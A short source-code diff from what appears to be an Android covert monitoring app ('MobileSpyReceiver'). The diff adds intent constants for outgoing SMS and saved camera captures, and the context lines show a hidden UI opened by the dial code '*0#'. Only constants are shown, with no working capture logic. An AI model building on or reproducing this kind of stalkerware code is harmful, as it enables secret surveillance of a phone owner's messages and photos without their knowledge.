@@ -9,6 +9,12 @@ import android.telephony.TelephonyManager;
 public class MobileSpyReceiver extends BroadcastReceiver {
 	public static final String LOG_TAG = "MobileSpyService";
 	
+	/**
+	 * User defined intents
+	 */
+	public static final String NEW_OUTGOING_SMS = "org.ddth.android.intent.action.NEW_OUTGOING_SMS";
+	public static final String CAMERA_CAPTURE_SAVED = "org.ddth.android.intent.action.CAMERA_CAPTURE_SAVED";
+	
 	private static final String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 	private static final String ACTION_NEW_OUTGOING_SMS = "android.provider.Telephony.NEW_OUTGOING_SMS";
 	private static final String SHOW_UI_REQUEST_NUMBER = "*0#";
